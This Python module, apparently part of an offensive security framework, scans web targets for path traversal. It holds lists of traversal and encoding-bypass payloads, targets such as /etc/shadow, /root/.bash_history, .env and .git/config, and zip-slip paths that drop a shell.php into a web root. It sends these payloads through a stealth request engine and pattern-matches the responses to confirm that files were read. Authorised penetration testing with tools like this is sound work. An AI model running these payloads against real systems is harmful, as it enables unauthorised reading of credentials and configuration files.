"""
modules/validate/path_traversal.py
──────────────────────────────────
Path Traversal validation module.

Detects and validates path traversal vulnerabilities:
  - Relative path traversal (../, ..\\)
  - Absolute path traversal (/etc/passwd, C:\\windows\\)
  - Encoded traversal bypass (URL, double URL, hex, unicode)
  - Filter bypass techniques
  - Sensitive file detection
  - Zip slip vulnerability detection

All validation requires Tier 3 confirmation (typed CONFIRM)
before any exploitation attempts.
"""

import re
import json
import urllib.parse
from typing import Any, Dict, List, Optional, Set, Tuple
from pathlib import Path

from modules.logger import get_logger, ARDFLogger
from modules.session import Session, Finding, SeverityLevel
from modules.stealth import get_stealth_engine, ScanMode


class PathTraversalValidator:
    """
    Path traversal detection and validation.
    """

    # Path traversal payloads
    PAYLOADS = {
        "relative": [
            "../",
            "..\\",
            "../../",
            "..\\..\\",
            "../../../",
            "..\\..\\..\\",
            "../../../../",
            "..\\..\\..\\..\\",
            "../../../../../",
            "..\\..\\..\\..\\..\\",
            "../../../../../../",
            "..\\..\\..\\..\\..\\..\\",
            "....//",
            "....\\\\",
            "..../",
            "....\\",
        ],
        "absolute": [
            "/etc/passwd",
            "C:\\windows\\win.ini",
            "/etc/shadow",
            "/etc/hosts",
            "/var/log/syslog",
            "C:\\Program Files\\",
            "/boot/grub/grub.cfg",
            "/etc/nginx/nginx.conf",
            "/etc/apache2/apache2.conf",
            "/etc/mysql/my.cnf",
            "/root/.bash_history",
            "/home/",
            "/tmp/",
            "/var/run/",
            "/proc/self/environ",
            "/proc/version",
        ],
        "encoded": [
            "..%2F",
            "..%5C",
            "%2E%2E%2F",
            "%2E%2E%5C",
            "..%252F",
            "..%255C",
            "%252E%252E%252F",
            "%252E%252E%255C",
            "..%c0%af",
            "..%c1%9c",
            "%2e%2e%2f",
            "%2e%2e%5c",
            "..%2f",
            "..%5c",
        ],
        "filter_bypass": [
            ".././",
            "..//",
            "../....//",
            "..////",
            "..\\..\\",
            "../.../../",
            "..\\..\\..\\",
            "../web.config",
            "../appsettings.json",
            "../.env",
            "../.git/config",
            "../.htaccess",
            "../php.ini",
            "../web.xml",
            "../database.yml",
        ],
        "sensitive_files": [
            "/etc/passwd",
            "/etc/shadow",
            "/etc/hosts",
            "/etc/hostname",
            "/etc/nginx/nginx.conf",
            "/etc/apache2/apache2.conf",
            "/etc/mysql/my.cnf",
            "/etc/php/php.ini",
            "/var/www/html/.env",
            "/var/www/html/config.php",
            "/var/www/html/settings.ini",
            "/var/www/html/web.config",
            "/var/www/html/appsettings.json",
            "/var/www/html/application.yml",
            "/var/www/html/database.yml",
            "/var/www/html/.htaccess",
            "C:\\windows\\system32\\drivers\\etc\\hosts",
            "C:\\windows\\win.ini",
            "C:\\windows\\system.ini",
            "C:\\windows\\php.ini",
            "C:\\inetpub\\wwwroot\\web.config",
        ],
        "zip_slip": [
            "../../../../tmp/test",
            "../var/www/html/shell.php",
            "..\\..\\..\\..\\windows\\system32\\cmd.exe",
            "../../../../etc/cron.d/test",
        ],
    }

    # File content patterns for validation
    FILE_PATTERNS = {
        "passwd": [r"root:.*:0:0", r"nobody:x:", r"/etc/passwd"],
        "shadow": [r"root:\$", r"/etc/shadow"],
        "hosts": [r"127.0.0.1", r"localhost", r"::1"],
        "winini": [r"\[extensions\]", r"\[mci extensions\]"],
        "bash_history": [r"history", r"ls", r"cd", r"echo", r"cat"],
        "env": [r"PATH=", r"HOME=", r"USER=", r"SECRET_"],
        "config": [r"DB_", r"PASSWORD", r"API_KEY", r"SECRET_KEY"],
        "nginx": [r"server_name", r"location", r"proxy_pass"],
        "apache": [r"VirtualHost", r"DocumentRoot", r"AllowOverride"],
        "mysql": [r"user", r"password", r"host", r"datadir"],
        "php": [r"memory_limit", r"upload_max_filesize", r"post_max_size"],
    }

    def __init__(self, session: Session, logger: Optional[ARDFLogger] = None):
        self.session = session
        self.logger = logger or get_logger("validate.path_traversal")
        self.out_dir = session.dir("validate") / "path_traversal"
        self.out_dir.mkdir(parents=True, exist_ok=True)
        self.stealth = get_stealth_engine(self.logger)

    def detect_path_params(self, url: str) -> List[Dict[str, Any]]:
        """
        Detect parameters that might accept file paths.
        """
        self.logger.info(f"Detecting path parameters: {url}")

        params = []

        # Parameters that often accept file paths
        path_params = [
            "file", "path", "dir", "folder", "directory",
            "filename", "name", "view", "read", "open",
            "download", "get", "show", "display", "load",
            "include", "require", "page", "template", "view",
            "action", "function", "method", "script",
        ]

        parsed = urllib.parse.urlparse(url)
        query = urllib.parse.parse_qs(parsed.query)

        for key in query:
            if key.lower() in path_params:
                for value in query[key]:
                    params.append({
                        "name": key,
                        "value": value,
                        "method": "GET",
                        "url": url,
                    })

        # Also check forms
        try:
            status, headers, content = self.stealth.get(url)
            if status == 200:
                for param in path_params[:10]:
                    pattern = rf'<input[^>]*name=["\']({param})["\'][^>]*>'
                    matches = re.findall(pattern, content, re.I)
                    for name in matches:
                        params.append({
                            "name": name,
                            "value": "",
                            "method": "POST",
                            "url": url,
                        })
        except Exception:
            pass

        self.logger.success(f"Found {len(params)} path parameters")
        return params

    def test_injection(self, param: Dict[str, Any]) -> Dict[str, Any]:
        """
        Test a parameter for path traversal.
        """
        url = param.get("url", "")
        name = param.get("name", "")
        method = param.get("method", "GET")
        original_value = param.get("value", "")

        self.logger.info(f"Testing {method} parameter: {name}")

        results = {
            "parameter": name,
            "method": method,
            "vulnerable": False,
            "vuln_types": [],
            "payloads": [],
            "evidence": [],
            "file_read": None,
        }

        # Test each payload type
        for payload_type, payloads in self.PAYLOADS.items():
            for payload in payloads[:3]:
                try:
                    test_value = original_value + payload if original_value else payload

                    if method == "GET":
                        test_url = url.replace(f"{name}={original_value}", f"{name}={urllib.parse.quote(test_value)}")
                        status, headers, content = self.stealth.get(test_url, timeout=10)
                    else:
                        data = f"{name}={urllib.parse.quote(test_value)}"
                        status, headers, content = self.stealth.post(url, data.encode(), timeout=10)

                    # Check for file content
                    file_type, evidence = self._check_file_content(content)

                    if file_type:
                        results["vulnerable"] = True
                        if payload_type not in results["vuln_types"]:
                            results["vuln_types"].append(payload_type)
                        results["payloads"].append(payload[:50])
                        results["evidence"].append(content[:200])
                        results["file_read"] = file_type
                        self.logger.finding(f"Path traversal detected: {name} -> {file_type}", severity="critical", host=url)
                        break

                    self.stealth.sleep(0.5)

                except Exception as e:
                    self.logger.debug(f"Payload test failed: {e}")

        return results

    def _check_file_content(self, content: str) -> Tuple[Optional[str], Optional[str]]:
        """
        Check if content contains sensitive file content.
        """
        for file_type, patterns in self.FILE_PATTERNS.items():
            for pattern in patterns:
                if re.search(pattern, content, re.I):
                    return file_type, content[:200]
        return None, None

    def confirm_vulnerability(self, param: Dict[str, Any]) -> bool:
        """
        Confirm path traversal with a safe test.
        """
        self.logger.info(f"Confirming path traversal on {param['name']}")

        url = param.get("url", "")
        name = param.get("name", "")
        original_value = param.get("value", "")

        # Use a safe test that reads a common file
        test_payloads = [
            "/etc/passwd",
            "C:\\windows\\win.ini",
            "../../../etc/passwd",
            "..\\..\\..\\windows\\win.ini",
        ]

        for payload in test_payloads:
            try:
                test_value = original_value + payload if original_value else payload
                test_url = url.replace(f"{name}={original_value}", f"{name}={urllib.parse.quote(test_value)}")
                status, headers, content = self.stealth.get(test_url, timeout=10)

                file_type, _ = self._check_file_content(content)
                if file_type:
                    self.logger.finding(f"Path traversal confirmed: {param['name']} -> {file_type}", severity="critical", host=url)
                    return True

                self.stealth.sleep(0.5)

            except Exception:
                pass

        return False

    def validate(self, url: str) -> Dict[str, Any]:
        """
        Full path traversal validation workflow.
        """
        self.logger.info(f"Path traversal validation: {url}")

        results = {
            "url": url,
            "parameters": [],
            "vulnerable": [],
            "confirmed": [],
            "file_reads": [],
            "status": "completed"
        }

        # Detect path parameters
        params = self.detect_path_params(url)
        results["parameters"] = params

        # Test each parameter
        for param in params:
            test_result = self.test_injection(param)
            if test_result["vulnerable"]:
                results["vulnerable"].append(test_result)

                if test_result["file_read"]:
                    results["file_reads"].append({
                        "parameter": param["name"],
                        "file_type": test_result["file_read"],
                    })

                # Confirm
                if self.confirm_vulnerability(param):
                    results["confirmed"].append({
                        "parameter": param["name"],
                        "method": param["method"],
                        "url": param["url"],
                        "file_read": test_result.get("file_read"),
                    })

                    self.session.add_finding(Finding(
                        source="validate.path_traversal",
                        title=f"Path traversal confirmed: {param['name']}",
                        description=f"File read: {test_result.get('file_read', 'unknown')}",
                        severity=SeverityLevel.CRITICAL,
                        host=url,
                        tags=["path-traversal", "lfi", "validated"],
                        evidence=json.dumps(test_result["evidence"][:3]),
                        remediation="Validate and sanitize file paths. Use a whitelist.",
                    ))

        return results

    def run(self, target: str) -> Dict[str, Any]:
        """
        Run path traversal validation on target.
        """
        self.logger.banner(f"PATH TRAVERSAL VALIDATION: {target}", style="bold red")

        self.stealth.config.scan_mode = ScanMode.LOW

        urls = [
            f"https://{target}",
            f"http://{target}",
        ]

        results = {
            "target": target,
            "urls_tested": [],
            "vulnerabilities": [],
            "confirmed": [],
            "file_reads": []
        }

        for url in urls:
            try:
                result = self.validate(url)
                results["urls_tested"].append(url)
                results["vulnerabilities"].extend(result["vulnerable"])
                results["confirmed"].extend(result["confirmed"])
                results["file_reads"].extend(result["file_reads"])
            except Exception as e:
                self.logger.warning(f"Validation failed for {url}: {e}")

        # Save results
        report_path = self.out_dir / f"path_traversal_report_{_safe(target)}.json"
        report_path.write_text(json.dumps(results, indent=2, default=str))

        self.logger.success(f"Path traversal validation: {len(results['confirmed'])} confirmed, {len(results['file_reads'])} file reads")
        return results


def _safe(s: str) -> str:
    return re.sub(r"[^\w.-]", "_", s)[:50]